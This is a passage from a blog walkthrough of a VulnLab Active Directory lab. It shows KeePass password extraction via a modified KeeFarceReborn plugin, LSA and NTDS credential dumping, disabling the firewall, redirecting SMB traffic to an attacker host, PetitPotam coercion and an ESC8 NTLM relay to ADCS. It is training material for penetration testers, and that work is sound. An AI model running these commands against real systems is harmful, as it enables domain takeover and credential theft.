<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Configuration xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</span><br><span class="line">        &lt;Meta&gt;</span><br><span class="line">                &lt;PreferUserConfiguration&gt;true&lt;/PreferUserConfiguration&gt;</span><br><span class="line">        &lt;/Meta&gt;</span><br><span class="line">&lt;Policy&gt;</span><br><span class="line">    &lt;Plugins&gt;true&lt;/Plugins&gt;</span><br><span class="line">    &lt;Export&gt;true&lt;/Export&gt;</span><br><span class="line">&lt;/Policy&gt;</span><br><span class="line">&lt;/Configuration</span><br></pre></td></tr></table></figure>

<p><strong>Step 2:</strong> Copy the Keepass.exe into the KeeFarceRebornPlugin folder</p>
<p><strong>Step 3:</strong> Have Visual Studio ready on a VM to compile the DLL</p>
<p><strong>Step 4:</strong> Change the KeeFarceRebornPlugin so it exports the file to <code>C://ProgramFiles//</code> without a message box</p>
<p><strong>Step 5:</strong> Put the DLL inside the <code>\Plugins</code> folder and wait for a file to show up inside <code>C://ProgramFiles//</code></p>
<p>It took me many tries and restarts of the machine, but finally, it returned the cleartext password:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Password&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="LSA-Secrets-Dumping"><a href="#LSA-Secrets-Dumping" class="headerlink" title="LSA Secrets Dumping"></a>LSA Secrets Dumping</h2><p>Now that we are a local administrator, we can dump the LSA secrets:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec smb 10.10.187.150 -u administrator -p &#x27;&lt;Password&gt;&#x27; --local-auth --lsa</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kaiju/lsa-dump.png" alt="LSA Dump"></p>
<p>We obtain domain credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kaiju.vl\clare.frost:&lt;Password&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h2><p>Now that we have a domain user, we run the basic enumeration: shares, LDAP dump, and look for vulnerable certificates.</p>
<p>Running Certipy, we discover that we have an <strong>ESC8</strong> vulnerability.</p>
<h3 id="Certificate-Authority-Enumeration"><a href="#Certificate-Authority-Enumeration" class="headerlink" title="Certificate Authority Enumeration"></a>Certificate Authority Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy find -target 10.10.187.151 -dc-ip 10.10.187.151 -u &#x27;clare.frost&#x27; -p &#x27;&lt;Password&gt;&#x27; -debug -vulnerable</span><br></pre></td></tr></table></figure>

<p>Results:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : kaiju-sub-CA</span><br><span class="line">    DNS Name                            : BERSRV105.kaiju.vl</span><br><span class="line">    Certificate Subject                 : CN=kaiju-sub-CA, DC=kaiju, DC=vl</span><br><span class="line">    Certificate Serial Number           : 71000000048715771814C1ABBA000000000004</span><br><span class="line">    Certificate Validity Start          : 2024-01-21 14:57:07+00:00</span><br><span class="line">    Certificate Validity End            : 2026-01-21 15:07:07+00:00</span><br><span class="line">    Web Enrollment                      : Enabled</span><br><span class="line">    User Specified SAN                  : Disabled</span><br><span class="line">    Request Disposition                 : Issue</span><br><span class="line">    Enforce Encryption for Requests     : Enabled</span><br><span class="line">    Permissions</span><br><span class="line">      Owner                             : KAIJU.VL\Administrators</span><br><span class="line">      Access Rights</span><br><span class="line">        ManageCertificates              : KAIJU.VL\Administrators</span><br><span class="line">                                          KAIJU.VL\Domain Admins</span><br><span class="line">                                          KAIJU.VL\Enterprise Admins</span><br><span class="line">        ManageCa                        : KAIJU.VL\Administrators</span><br><span class="line">                                          KAIJU.VL\Domain Admins</span><br><span class="line">                                          KAIJU.VL\Enterprise Admins</span><br><span class="line">        Enroll                          : KAIJU.VL\Authenticated Users</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br></pre></td></tr></table></figure>

<p>Only <strong>BERSRV200.kaiju.vl</strong> has SMB signing disabled, so that’s the only place we can relay back to if we manage to exploit this ESC8.</p>
<h3 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h3><p>Before we try to exploit ESC8, let’s get a BloodHound dump:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec ldap 10.10.187.149 -u clare.frost -p &#x27;&lt;Password&gt;&#x27; --bloodhound --dns-server 10.10.187.149 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>

<p>We cannot find anything interesting that the user clare.frost has privileged access to, so we will start exploiting the ESC8 vulnerability.</p>
<hr>
<h2 id="ESC8-Exploitation"><a href="#ESC8-Exploitation" class="headerlink" title="ESC8 Exploitation"></a>ESC8 Exploitation</h2><p>Since we need to download a couple of tools on the machine, we’ll first disable the firewall:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False</span><br></pre></td></tr></table></figure>

<p>Check if the firewall is disabled:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetFirewallProfile | Format-Table Name, Enabled</span><br></pre></td></tr></table></figure>

<h3 id="StreamDivert-Setup"><a href="#StreamDivert-Setup" class="headerlink" title="StreamDivert Setup"></a>StreamDivert Setup</h3><p>To exploit ESC8, we need to somehow forward all the SMB traffic of BERSRV200.kaiju.vl to our machine. To do that, we use a tool named <strong>StreamDivert</strong>.</p>
<p>Download from: <a target="_blank" rel="noopener" href="https://github.com/jellever/StreamDivert">https://github.com/jellever/StreamDivert</a></p>
<p>Upload the following files:</p>
<ul>
<li>StreamDivert executable</li>
<li>WinDivert64.sys</li>
<li>WinDivert.dll</li>
</ul>
<p>You can use evil-winrm to access the machine and upload the executables. We also need a <code>config.txt</code> file that contains:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp &lt; 445 0.0.0.0 -&gt; &lt;Attacker IP&gt; 445</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kaiju/stream-divert.png" alt="StreamDivert Configuration"></p>
<h3 id="Coercion-Attack"><a href="#Coercion-Attack" class="headerlink" title="Coercion Attack"></a>Coercion Attack</h3><p>Now we use PetitPotam to coerce authentication:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 PetitPotam.py -u &#x27;clare.frost&#x27; -p &#x27;&lt;Password&gt;&#x27; 10.10.187.150 10.10.187.149</span><br></pre></td></tr></table></figure>

<p>We use BERSRV200.kaiju.vl to perform the coercion and ask BERSRV100.kaiju.vl for its NTLMv2-SSP Hash. Since we forward the traffic from port 445 back to us, we can capture it on our machine using Responder:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>

<h3 id="NTLM-Relay-to-ADCS"><a href="#NTLM-Relay-to-ADCS" class="headerlink" title="NTLM Relay to ADCS"></a>NTLM Relay to ADCS</h3><p>Now we use ntlmrelayx to abuse the ESC8 vulnerability:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains4 ntlmrelayx.py -t http://BERSRV105.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</span><br></pre></td></tr></table></figure>

<h3 id="Certificate-Authentication"><a href="#Certificate-Authentication" class="headerlink" title="Certificate Authentication"></a>Certificate Authentication</h3><p>Now we can authenticate using the obtained certificate with Certipy:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy auth -pfx BERSRV100.pfx -dc-ip 10.10.187.149</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kaiju/certipy-hash.png" alt="Certipy Hash Extraction"></p>
<h3 id="NTDS-Dump"><a href="#NTDS-Dump" class="headerlink" title="NTDS Dump"></a>NTDS Dump</h3><p>Performing a complete domain dump:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec smb 10.10.187.149 -u &#x27;BERSRV100$&#x27; -H &lt;Hash&gt; --ntds</span><br></pre></td></tr></table></figure>

<p>Finally, we get into the machine using evil-winrm and capture the root flag!</p>
<hr>
<h2 id="Alternative-Path-2-In-Progress"><a href="#Alternative-Path-2-In-Progress" class="headerlink" title="Alternative Path 2 (In Progress)"></a>Alternative Path 2 (In Progress)</h2><p>We can use <strong>KrbRelay</strong> from inside the machine, though this is a bit more challenging than it sounds.</p>
<h3 id="Interesting-Resources"><a href="#Interesting-Resources" class="headerlink" title="Interesting Resources"></a>Interesting Resources</h3><p>Some interesting material you can look into that covers good relaying attacks:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html">https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html</a></li>
<li><a href="https://panosoikogr.github.io/2025/03/30/VL-Cicada/">https://panosoikogr.github.io/2025/03/30/VL-Cicada/</a></li>
</ul>
<p><strong>Lab Link:</strong> <a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=3be5427d-7f10-47ea-a9f0-abfbf75703cb">https://api.vulnlab.com/api/v1/share?id=3be5427d-7f10-47ea-a9f0-abfbf75703cb</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writeups</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kaiju-VulnLab-Chain-Complete-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kaiju VulnLab Chain - Complete Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV100-kaiju-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - BERSRV100.kaiju.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV200-kaiju-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - BERSRV200.kaiju.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV105-kaiju-vl"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - BERSRV105.kaiju.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-FTP-Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access - FTP Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">FTP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileZilla-User-Configuration"><span class="toc-number">1.3.2.</span> <span class="toc-text">FileZilla User Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-Backup-User"><span class="toc-number">1.4.</span> <span class="toc-text">Password Cracking - Backup User</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#E-Drive-Exploration"><span class="toc-number">1.5.</span> <span class="toc-text">E:\ Drive Exploration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FileZilla-Admin-Interface-Access"><span class="toc-number">1.6.</span> <span class="toc-text">FileZilla Admin Interface Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-FileZilla-Server-1-8-0"><span class="toc-number">1.6.1.</span> <span class="toc-text">Installing FileZilla Server 1.8.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Configuration-Issues"><span class="toc-number">1.6.2.</span> <span class="toc-text">User Configuration Issues</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Access-via-FTP"><span class="toc-number">1.7.</span> <span class="toc-text">SSH Access via FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KeePass-Database-Exploitation"><span class="toc-number">1.8.</span> <span class="toc-text">KeePass Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KeeFarceReborn-Setup"><span class="toc-number">1.8.1.</span> <span class="toc-text">KeeFarceReborn Setup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSA-Secrets-Dumping"><span class="toc-number">1.9.</span> <span class="toc-text">LSA Secrets Dumping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.10.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authority-Enumeration"><span class="toc-number">1.10.1.</span> <span class="toc-text">Certificate Authority Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.10.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC8-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ESC8 Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#StreamDivert-Setup"><span class="toc-number">1.11.1.</span> <span class="toc-text">StreamDivert Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coercion-Attack"><span class="toc-number">1.11.2.</span> <span class="toc-text">Coercion Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Relay-to-ADCS"><span class="toc-number">1.11.3.</span> <span class="toc-text">NTLM Relay to ADCS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authentication"><span class="toc-number">1.11.4.</span> <span class="toc-text">Certificate Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS-Dump"><span class="toc-number">1.11.5.</span> <span class="toc-text">NTDS Dump</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-2-In-Progress"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path 2 (In Progress)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Interesting-Resources"><span class="toc-number">1.12.1.</span> <span class="toc-text">Interesting Resources</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&text=VL-Kaiju"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&is_video=false&description=VL-Kaiju"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Kaiju&body=Check out this article: https://panosoikogr.github.io/2025/11/22/VL-Kaiju/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&name=VL-Kaiju&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&t=VL-Kaiju"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2027
    Panosoiko
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

</body>
</html>
